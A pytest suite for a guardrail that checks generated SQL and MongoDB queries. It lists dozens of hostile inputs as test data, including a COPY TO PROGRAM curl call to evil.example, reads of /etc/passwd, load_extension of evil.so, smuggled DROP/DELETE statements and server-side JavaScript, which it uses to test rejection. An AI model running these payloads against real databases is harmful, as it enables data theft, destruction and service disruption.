"""Guardrail tests: malicious and edge-case queries must be rejected, safe ones rewritten.

Pure unit tests: no database needed. Each rejection test also checks *why* the query was
rejected, so we know the right rule caught it rather than an accidental parse error.
"""

from __future__ import annotations

import json
from datetime import datetime

import pytest
import sqlglot
from sqlglot import exp

from talktable.guardrails import (
    ALLOWED_STAGES,
    GuardrailError,
    is_denied_function,
    validate_mongo,
    validate_sql,
)

PG_TABLES = {"customers", "orders", "order_items"}
SQLITE_TABLES = {"authors", "categories", "books"}
COLLECTIONS = {"reviews", "clickstream"}


def pg(sql: str, **kwargs: object) -> str:
    kwargs.setdefault("allowed_tables", PG_TABLES)
    return validate_sql(sql, "postgres", **kwargs)  # type: ignore[arg-type]


def lite(sql: str, **kwargs: object) -> str:
    kwargs.setdefault("allowed_tables", SQLITE_TABLES)
    return validate_sql(sql, "sqlite", **kwargs)  # type: ignore[arg-type]


def mongo(query: object, **kwargs: object):  # type: ignore[no-untyped-def]
    kwargs.setdefault("allowed_collections", COLLECTIONS)
    return validate_mongo(query, **kwargs)  # type: ignore[arg-type]


# =============================================================================
# SQL: rejected
# =============================================================================

MALICIOUS_SQL = [
    # --- plain writes / DDL / permissions -----------------------------------
    ("postgres", "DROP TABLE orders", "not DROP"),
    ("postgres", "DELETE FROM orders", "not DELETE"),
    ("postgres", "dElEtE fRoM orders", "not DELETE"),
    ("postgres", "UPDATE orders SET total_amount = 0", "not UPDATE"),
    ("postgres", "INSERT INTO customers (customer_id, name) VALUES (9999, 'x')", "not INSERT"),
    ("postgres", "MERGE INTO orders o USING customers c ON o.customer_id = c.customer_id "
                 "WHEN MATCHED THEN DELETE", "not MERGE"),
    ("postgres", "ALTER TABLE orders ADD COLUMN x INT", "not ALTER"),
    ("postgres", "CREATE TABLE t (x INT)", "not CREATE"),
    ("postgres", "CREATE TEMP TABLE t AS SELECT * FROM customers", "not CREATE"),
    ("postgres", "CREATE VIEW v AS SELECT * FROM customers", "not CREATE"),
    ("postgres", "TRUNCATE orders", "not TRUNCATE"),
    ("postgres", "GRANT ALL ON orders TO PUBLIC", "not GRANT"),
    ("postgres", "REVOKE SELECT ON orders FROM talktable_ro", "not REVOKE"),
    # --- stacked statements and comments hiding them ------------------------
    ("postgres", "SELECT 1; DELETE FROM orders", "Only one SQL statement"),
    ("postgres", "SELECT * FROM orders; DROP TABLE orders", "Only one SQL statement"),
    ("postgres", "SELECT 1 -- just a comment\n; DROP TABLE orders", "Only one SQL statement"),
    ("postgres", "SELECT 1; -- trailing comment\nDELETE FROM orders", "Only one SQL statement"),
    ("postgres", "/* looks harmless */ DELETE FROM orders", "not DELETE"),
    ("postgres", "BEGIN; DELETE FROM orders; COMMIT", "Only one SQL statement"),
    ("sqlite", "SELECT 1; DROP TABLE books", "Only one SQL statement"),
    # --- writes hidden inside a SELECT --------------------------------------
    ("postgres", "WITH gone AS (DELETE FROM orders RETURNING *) SELECT * FROM gone", "DELETE is not allowed"),
    ("postgres", "WITH u AS (UPDATE orders SET status = 'x' RETURNING order_id) SELECT count(*) FROM u",
     "UPDATE is not allowed"),
    ("postgres", "WITH x AS (SELECT 1) INSERT INTO orders SELECT * FROM x", "not INSERT"),
    ("postgres", "SELECT * INTO stolen FROM customers", "SELECT ... INTO is not allowed"),
    ("postgres", "SELECT * FROM orders FOR UPDATE", "FOR UPDATE/SHARE"),
    ("postgres", "SELECT * FROM orders FOR SHARE", "FOR UPDATE/SHARE"),
    # --- server files, programs and other databases -------------------------
    ("postgres", "COPY customers TO '/tmp/customers.csv'", "not COPY"),
    ("postgres", "COPY (SELECT * FROM customers) TO PROGRAM 'curl http://evil.example'", "not COPY"),
    ("postgres", "SELECT pg_read_file('/etc/passwd')", "pg_read_file() is not allowed"),
    ("postgres", "SELECT pg_ls_dir('.')", "pg_ls_dir() is not allowed"),
    ("postgres", "SELECT lo_import('/etc/passwd')", "lo_import() is not allowed"),
    ("postgres", "SELECT lo_export(16400, '/tmp/x')", "lo_export() is not allowed"),
    ("postgres", "SELECT dblink_exec('dbname=bookstore', 'DROP TABLE orders')", "dblink_exec() is not allowed"),
    # --- dangerous functions, wherever they hide ----------------------------
    ("postgres", "SELECT pg_sleep(10)", "pg_sleep() is not allowed"),
    ("postgres", "SELECT PG_SLEEP(10)", "pg_sleep() is not allowed"),
    ("postgres", "SELECT pg_catalog.pg_sleep(10)", "pg_sleep() is not allowed"),
    ("postgres", 'SELECT "pg_sleep"(10)', "pg_sleep() is not allowed"),
    ("postgres", "SELECT * FROM orders, LATERAL pg_sleep(1)", "pg_sleep() is not allowed"),
    ("postgres", "SELECT * FROM orders WHERE pg_sleep(5) IS NULL", "pg_sleep() is not allowed"),
    ("postgres", "SELECT * FROM (SELECT pg_sleep(5)) AS t", "pg_sleep() is not allowed"),
    ("postgres", "SELECT order_id FROM orders UNION ALL SELECT pg_sleep(5)::int", "pg_sleep() is not allowed"),
    ("postgres", "SELECT set_config('default_transaction_read_only', 'off', false)", "set_config() is not allowed"),
    ("postgres", "SELECT query_to_xml('DELETE FROM orders', true, true, '')", "query_to_xml() is not allowed"),
    ("postgres", "SELECT nextval('orders_order_id_seq')", "nextval() is not allowed"),
    ("postgres", "SELECT pg_terminate_backend(1234)", "pg_terminate_backend() is not allowed"),
    ("postgres", "SELECT pg_advisory_lock(1)", "pg_advisory_lock() is not allowed"),
    # --- session, procedural and admin commands ------------------------------
    ("postgres", "SET default_transaction_read_only = off", "not SET"),
    ("postgres", "EXPLAIN ANALYZE DELETE FROM orders", "not EXPLAIN"),
    ("postgres", "DO $$ BEGIN DELETE FROM orders; END $$", "not DO"),
    ("postgres", "CALL refresh_everything()", "not CALL"),
    ("postgres", "PREPARE p AS DELETE FROM orders", "not PREPARE"),
    ("postgres", "LOCK TABLE orders", "not LOCK"),
    ("postgres", "VACUUM FULL", "not VACUUM"),
    ("postgres", "SHOW ALL", "not SHOW"),
    ("postgres", "LISTEN channel", "Only SELECT queries are allowed"),
    ("postgres", "NOTIFY channel, 'x'", "could not be parsed"),
    ("postgres", "TABLE orders", "Only SELECT queries are allowed"),
    ("postgres", "VALUES (1), (2)", "not VALUES"),
    # --- reading outside the allowed tables ---------------------------------
    ("postgres", "SELECT * FROM pg_catalog.pg_authid", "outside this database"),
    ("postgres", "SELECT * FROM information_schema.tables", "outside this database"),
    ("postgres", "SELECT * FROM otherdb.public.orders", "outside this database"),
    ("postgres", "SELECT * FROM pg_shadow", "Unknown table 'pg_shadow'"),
    ("postgres", "SELECT * FROM secret_salaries", "Unknown table 'secret_salaries'"),
    ("sqlite", "SELECT * FROM sqlite_master", "Unknown table 'sqlite_master'"),
    ("sqlite", "SELECT * FROM evil.books", "outside this database"),
    # --- SQLite specifics ----------------------------------------------------
    ("sqlite", "ATTACH DATABASE '/tmp/evil.db' AS evil", "not ATTACH"),
    ("sqlite", "DETACH DATABASE main", "not DETACH"),
    ("sqlite", "PRAGMA writable_schema = ON", "not PRAGMA"),
    ("sqlite", "PRAGMA query_only = OFF", "not PRAGMA"),
    ("sqlite", "SELECT * FROM pragma_table_info('books')", "pragma_table_info() is not allowed"),
    ("sqlite", "SELECT load_extension('/tmp/evil.so')", "load_extension() is not allowed"),
    ("sqlite", "SELECT readfile('/etc/passwd')", "readfile() is not allowed"),
    ("sqlite", "SELECT writefile('/tmp/x', 'data')", "writefile() is not allowed"),
    ("sqlite", "SELECT randomblob(1000000000)", "randomblob() is not allowed"),
    ("sqlite", "SELECT zeroblob(1000000000)", "zeroblob() is not allowed"),
    ("sqlite", "REPLACE INTO books (book_id, title) VALUES (1, 'x')", "not REPLACE"),
    ("sqlite", "INSERT OR REPLACE INTO categories VALUES (1, 'x')", "not INSERT"),
    ("sqlite", "VACUUM INTO '/tmp/copy.db'", "not VACUUM"),
    ("sqlite", "CREATE TRIGGER t AFTER INSERT ON books BEGIN DELETE FROM books; END", "Only one SQL statement"),
    ("sqlite", "DROP TABLE books", "not DROP"),
    ("sqlite", "REINDEX", "Only SELECT queries are allowed"),
    ("sqlite", "ANALYZE", "not ANALYZE"),
    # --- garbage and empty input --------------------------------------------
    ("postgres", "", "empty"),
    ("postgres", "   ;  ", "empty"),
    ("postgres", "please drop the books table", "could not be parsed"),
    ("postgres", "SELECT * FROM (", "could not be parsed"),
    ("postgres", "SELECT 1 " + "+ 1 " * 6000, "too long"),
]


@pytest.mark.parametrize(
    ("dialect", "sql", "reason"),
    MALICIOUS_SQL,
    ids=[f"{d}:{s[:50]}" for d, s, _ in MALICIOUS_SQL],
)
def test_malicious_sql_is_rejected(dialect: str, sql: str, reason: str) -> None:
    tables = PG_TABLES if dialect == "postgres" else SQLITE_TABLES
    with pytest.raises(GuardrailError) as caught:
        validate_sql(sql, dialect, allowed_tables=tables)  # type: ignore[arg-type]
    assert reason in str(caught.value)


def test_at_least_25_malicious_sql_cases() -> None:
    assert len(MALICIOUS_SQL) >= 25


@pytest.mark.parametrize(
    "sql",
    [
        # sqlglot (like Postgres) understands nested comments: the DELETE is inside one.
        "SELECT 1 /* outer /* inner */ ; DELETE FROM orders; */",
        "SELECT 'a; DROP TABLE orders' AS harmless_string",
        "SELECT 1 -- ; DROP TABLE orders",
        "SELECT /* DROP TABLE orders */ count(*) FROM orders",
        "SELECT $$; DELETE FROM orders; $$ AS dollar_quoted",
    ],
)
def test_comment_and_string_tricks_never_smuggle_a_statement(sql: str) -> None:
    """Either rejected, or the SQL that will run is one SELECT with no hidden write."""
    try:
        safe = pg(sql)
    except GuardrailError:
        return
    tree = sqlglot.parse_one(safe, read="postgres")
    assert isinstance(tree, exp.Select)
    assert not list(tree.find_all(exp.Delete, exp.Drop))
    assert "/*" not in safe and "--" not in safe  # comments are stripped


# =============================================================================
# SQL: allowed, and rewritten safely
# =============================================================================


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT title, price FROM books ORDER BY price DESC LIMIT 5",
        "SELECT c.name, COUNT(*) FROM books b JOIN categories c ON c.category_id = b.category_id GROUP BY c.name",
        "SELECT strftime('%Y', 'now'), substr(title, 1, 10), ifnull(NULL, 1) FROM books LIMIT 1",
        "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT sum(n) FROM r",
        "SELECT a.name FROM authors a WHERE a.author_id IN (SELECT author_id FROM books WHERE price > 50)",
        "SELECT title FROM books WHERE title LIKE '%Collector%';",
    ],
)
def test_safe_sqlite_queries_pass(sql: str) -> None:
    assert isinstance(sqlglot.parse_one(lite(sql), read="sqlite"), exp.Select)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT date_trunc('month', order_date)::date AS month, count(*) FROM orders "
        "WHERE order_date >= '2025-01-01' GROUP BY 1 ORDER BY 1",
        "SELECT c.city, count(*) FILTER (WHERE o.status = 'delivered') FROM customers c "
        "JOIN orders o USING (customer_id) GROUP BY c.city",
        "WITH spend AS (SELECT customer_id, SUM(total_amount) s FROM orders GROUP BY customer_id) "
        "SELECT c.name, spend.s FROM spend JOIN customers c ON c.customer_id = spend.customer_id",
        "SELECT name FROM customers WHERE name ILIKE '%son%'",
        "SELECT EXTRACT(YEAR FROM order_date) AS y, pg_typeof(total_amount) FROM orders LIMIT 1",
        "SELECT * FROM generate_series(1, 3) AS g(n)",
        "SELECT order_id FROM orders UNION SELECT order_id FROM order_items",
    ],
)
def test_safe_postgres_queries_pass(sql: str) -> None:
    safe = pg(sql)
    assert isinstance(sqlglot.parse_one(safe, read="postgres"), (exp.Select, exp.SetOperation))


def _outer_limit(sql: str, dialect: str) -> str | None:
    limit = sqlglot.parse_one(sql, read=dialect).args.get("limit")
    return limit.sql(dialect=dialect) if limit else None


@pytest.mark.parametrize(
    ("dialect", "sql", "expected_limit"),
    [
        ("sqlite", "SELECT * FROM books", "LIMIT 200"),                    # injected
        ("sqlite", "SELECT * FROM books LIMIT 5000", "LIMIT 200"),         # lowered
        ("sqlite", "SELECT * FROM books LIMIT 5", "LIMIT 5"),              # kept
        ("sqlite", "SELECT * FROM books LIMIT 200", "LIMIT 200"),          # kept (boundary)
        ("sqlite", "SELECT * FROM books LIMIT -1", "LIMIT 200"),           # -1 = unlimited in SQLite
        ("sqlite", "SELECT * FROM books LIMIT 5, 500", "LIMIT 200"),       # MySQL-style offset, count
        ("postgres", "SELECT * FROM orders LIMIT ALL", "LIMIT 200"),
        ("postgres", "SELECT * FROM orders LIMIT (SELECT 100000)", "LIMIT 200"),
        ("postgres", "SELECT * FROM orders LIMIT NULL", "LIMIT 200"),
        ("postgres", "SELECT * FROM orders FETCH FIRST 500 ROWS ONLY", "LIMIT 200"),
        ("postgres", "SELECT * FROM orders FETCH FIRST 10 ROWS ONLY", "FETCH FIRST 10 ROWS ONLY"),
        ("postgres", "SELECT order_id FROM orders UNION SELECT order_id FROM order_items LIMIT 999", "LIMIT 200"),
    ],
)
def test_outer_limit_is_enforced(dialect: str, sql: str, expected_limit: str) -> None:
    tables = PG_TABLES if dialect == "postgres" else SQLITE_TABLES
    safe = validate_sql(sql, dialect, allowed_tables=tables)  # type: ignore[arg-type]
    assert _outer_limit(safe, dialect) == expected_limit


def test_offset_is_kept_when_limit_is_lowered() -> None:
    assert lite("SELECT * FROM books LIMIT 5, 500").endswith("LIMIT 200 OFFSET 5")


def test_custom_max_rows() -> None:
    assert _outer_limit(lite("SELECT * FROM books LIMIT 50", max_rows=10), "sqlite") == "LIMIT 10"


def test_inner_limits_are_left_alone() -> None:
    safe = lite("SELECT * FROM (SELECT * FROM books ORDER BY price LIMIT 1000) AS cheap")
    assert "LIMIT 1000" in safe and safe.endswith("LIMIT 200")


def test_comments_are_stripped() -> None:
    safe = pg("SELECT /* note */ order_id -- trailing\nFROM orders")
    assert "note" not in safe and "trailing" not in safe


def test_cte_names_count_as_tables() -> None:
    pg("WITH recent AS (SELECT * FROM orders WHERE order_date > '2026-01-01') SELECT count(*) FROM recent")


def test_table_names_are_case_insensitive() -> None:
    pg("SELECT * FROM ORDERS")


def test_qualified_default_schema_is_allowed() -> None:
    pg("SELECT * FROM public.orders")
    lite("SELECT * FROM main.books")


def test_no_table_allowlist_still_blocks_writes_and_functions() -> None:
    validate_sql("SELECT * FROM anything_at_all", "postgres")  # allowed without an allowlist
    with pytest.raises(GuardrailError):
        validate_sql("DELETE FROM anything_at_all", "postgres")
    with pytest.raises(GuardrailError):
        validate_sql("SELECT pg_sleep(1)", "postgres")


def test_sqlite_output_uses_substr_for_old_sqlite_versions() -> None:
    assert "SUBSTR(" in lite("SELECT substr(title, 1, 5) FROM books")
    assert "SUBSTRING(" not in lite("SELECT substring(title, 1, 5) FROM books")


@pytest.mark.parametrize("disabled_layer", ["_check_functions", "_verify_output"])
def test_each_function_check_layer_works_alone(monkeypatch: pytest.MonkeyPatch, disabled_layer: str) -> None:
    """The syntax-tree check and the final token scan each block denied functions alone."""
    from talktable import guardrails

    monkeypatch.setattr(guardrails, disabled_layer, lambda *args, **kwargs: None)
    for sql in ("SELECT pg_sleep(5)", "SELECT * FROM orders, LATERAL pg_read_file('/etc/passwd')"):
        with pytest.raises(GuardrailError, match="is not allowed"):
            pg(sql)


@pytest.mark.parametrize("name", ["pg_sleep", "PG_SLEEP", "lo_import", "dblink", "load_extension", "pragma_index_list"])
def test_denied_function_names(name: str) -> None:
    assert is_denied_function(name)


@pytest.mark.parametrize("name", ["count", "date_trunc", "strftime", "coalesce", "pg_typeof", "round"])
def test_allowed_function_names(name: str) -> None:
    assert not is_denied_function(name)


# =============================================================================
# Mongo: rejected
# =============================================================================


def q(pipeline: object, collection: str = "reviews") -> dict[str, object]:
    return {"collection": collection, "pipeline": pipeline}


MALICIOUS_MONGO = [
    # --- writes ---------------------------------------------------------------
    (q([{"$out": "stolen"}]), "$out is not allowed"),
    (q([{"$match": {}}, {"$merge": {"into": "reviews"}}]), "$merge is not allowed"),
    (q([{"$facet": {"a": [{"$out": "x"}]}}]), "$out is not allowed"),
    (q([{"$lookup": {"from": "clickstream", "as": "c", "pipeline": [{"$merge": "x"}]}}]), "$merge is not allowed"),
    # --- server-side JavaScript -------------------------------------------------
    (q([{"$match": {"$where": "sleep(5000) || true"}}]), "$where is not allowed"),
    (q([{"$addFields": {"x": {"$function": {"body": "function() { return 1 }", "args": [], "lang": "js"}}}}]),
     "$function is not allowed"),
    (q([{"$group": {"_id": None, "x": {"$accumulator": {"init": "function() {}"}}}}]), "$accumulator is not allowed"),
    (q([{"$match": {"$expr": {"$function": {"body": "1", "args": [], "lang": "js"}}}}]), "$function is not allowed"),
    (q([{"$facet": {"a": [{"$lookup": {"from": "reviews", "as": "r",
                                        "pipeline": [{"$match": {"$where": "true"}}]}}]}}]), "$where is not allowed"),
    (json.dumps(q([{"$match": {"$expr": {"$code": "function() { return true }"}}}])), "JavaScript code is not allowed"),
    # --- stages outside the allowlist -------------------------------------------
    (q([{"$unionWith": "clickstream"}]), "Stage $unionWith is not allowed"),
    (q([{"$graphLookup": {"from": "reviews"}}]), "Stage $graphLookup is not allowed"),
    (q([{"$collStats": {"latencyStats": {}}}]), "Stage $collStats is not allowed"),
    (q([{"$currentOp": {}}]), "Stage $currentOp is not allowed"),
    (q([{"$indexStats": {}}]), "Stage $indexStats is not allowed"),
    (q([{"$planCacheStats": {}}]), "Stage $planCacheStats is not allowed"),
    (q([{"$sample": {"size": 10}}]), "Stage $sample is not allowed"),
    (q([{"$documents": [{"x": 1}]}]), "Stage $documents is not allowed"),
    (q([{"$facet": {"a": [{"$sample": {"size": 1}}]}}]), "Stage $sample is not allowed"),
    # --- collections ---------------------------------------------------------------
    (q([], collection="system.users"), "can't be queried"),
    (q([], collection="secrets"), "Unknown collection 'secrets'"),
    (q([], collection=""), "non-empty string"),
    (q([{"$lookup": {"from": "system.users", "as": "u", "localField": "x", "foreignField": "y"}}]),
     "can't be queried"),
    (q([{"$lookup": {"from": "secrets", "as": "s", "localField": "x", "foreignField": "y"}}]),
     "Unknown $lookup source 'secrets'"),
    (q([{"$lookup": {"from": {"db": "admin", "coll": "system.users"}, "as": "u"}}]), "non-empty string"),
    # --- malformed --------------------------------------------------------------
    (q({"$match": {}}), "must be a JSON array"),
    (q([{"$match": {}, "$limit": 5}]), "exactly one stage"),
    (q(["$match"]), "exactly one stage"),
    (q([{"$limit": -5}]), "$limit must be a positive integer"),
    (q([{"$limit": 0}]), "$limit must be a positive integer"),
    (q([{"$limit": "10"}]), "$limit must be a positive integer"),
    (q([{"$limit": True}]), "$limit must be a positive integer"),
    (q([{"$skip": -1}]), "$skip must be a non-negative integer"),
    (q([{"$skip": False}]), "$skip must be a non-negative integer"),
    ({"collection": "reviews", "pipeline": [], "options": {"allowDiskUse": True}}, "Unexpected keys"),
    ("{not json", "not valid JSON"),
    ("[1, 2, 3]", "must be a JSON object"),
    (q([{"$match": {"a": {"b": {"c": {"d": [[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[1]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]}}}}}]),
     "nested too deeply"),
    (q([{"$match": {}}] * 60), "too many stages"),
]


@pytest.mark.parametrize(("query", "reason"), MALICIOUS_MONGO, ids=[str(i) for i in range(len(MALICIOUS_MONGO))])
def test_malicious_mongo_is_rejected(query: object, reason: str) -> None:
    with pytest.raises(GuardrailError) as caught:
        mongo(query)
    assert reason in str(caught.value)


def test_at_least_25_malicious_mongo_cases() -> None:
    assert len(MALICIOUS_MONGO) >= 25


# =============================================================================
# Mongo: allowed, and rewritten safely
# =============================================================================


def test_limit_is_appended_when_missing() -> None:
    result = mongo(q([{"$match": {"rating": 1}}]))
    assert result.pipeline[-1] == {"$limit": 200}


def test_final_limit_is_lowered() -> None:
    assert mongo(q([{"$limit": 5000}])).pipeline == [{"$limit": 200}]


def test_small_final_limit_is_kept() -> None:
    assert mongo(q([{"$sort": {"rating": -1}}, {"$limit": 5}])).pipeline[-1] == {"$limit": 5}


def test_intermediate_limit_is_kept_and_output_capped() -> None:
    # A top-1000 sample feeding a $group: lowering it would change the answer.
    pipeline = [{"$sort": {"created_at": -1}}, {"$limit": 1000}, {"$group": {"_id": "$rating", "n": {"$sum": 1}}}]
    result = mongo(q(pipeline))
    assert result.pipeline[1] == {"$limit": 1000}
    assert result.pipeline[-1] == {"$limit": 200}


def test_custom_max_rows_for_mongo() -> None:
    assert mongo(q([]), max_rows=7).pipeline == [{"$limit": 7}]


def test_facet_outputs_are_capped() -> None:
    result = mongo(q([{"$facet": {"top": [{"$sort": {"rating": -1}}], "few": [{"$limit": 3}]}}]))
    facet = result.pipeline[0]["$facet"]
    assert facet["top"][-1] == {"$limit": 200}
    assert facet["few"] == [{"$limit": 3}]


def test_every_allowed_stage_passes() -> None:
    specs = {
        "$match": {"rating": {"$gte": 4}},
        "$project": {"book_id": 1},
        "$group": {"_id": "$book_id", "n": {"$sum": 1}},
        "$sort": {"n": -1},
        "$limit": 10,
        "$skip": 0,
        "$unwind": "$events",
        "$count": "total",
        "$lookup": {"from": "clickstream", "localField": "customer_id", "foreignField": "customer_id", "as": "s"},
        "$addFields": {"double": {"$multiply": ["$rating", 2]}},
        "$facet": {"by_rating": [{"$group": {"_id": "$rating"}}]},
    }
    assert set(specs) == ALLOWED_STAGES
    for stage, spec in specs.items():
        mongo(q([{stage: spec}]))


def test_lookup_with_sub_pipeline_is_allowed() -> None:
    mongo(q([{"$lookup": {"from": "clickstream", "as": "sessions",
                          "let": {"cid": "$customer_id"},
                          "pipeline": [{"$match": {"$expr": {"$eq": ["$customer_id", "$$cid"]}}}, {"$limit": 3}]}}]))


def test_input_dict_is_not_modified() -> None:
    original = q([{"$match": {"rating": 1}}])
    snapshot = json.dumps(original)
    mongo(original)
    assert json.dumps(original) == snapshot


def test_json_string_and_extended_json_dates() -> None:
    text = json.dumps(q([{"$match": {"created_at": {"$gte": {"$date": "2025-01-01T00:00:00Z"}}}}]))
    result = mongo(text)
    value = result.pipeline[0]["$match"]["created_at"]["$gte"]
    assert isinstance(value, datetime) and value.year == 2025


def test_extended_json_in_a_dict_is_resolved() -> None:
    result = mongo(q([{"$match": {"created_at": {"$lt": {"$date": "2026-01-01T00:00:00Z"}}}}]))
    assert isinstance(result.pipeline[0]["$match"]["created_at"]["$lt"], datetime)


def test_pipeline_may_be_a_json_string() -> None:
    result = mongo({"collection": "reviews", "pipeline": '[{"$match": {"rating": 5}}]'})
    assert result.pipeline[0] == {"$match": {"rating": 5}}


def test_query_text_round_trips() -> None:
    result = mongo(q([{"$match": {"created_at": {"$gte": {"$date": "2025-01-01T00:00:00Z"}}}}]))
    again = mongo(result.to_json())
    assert again == result
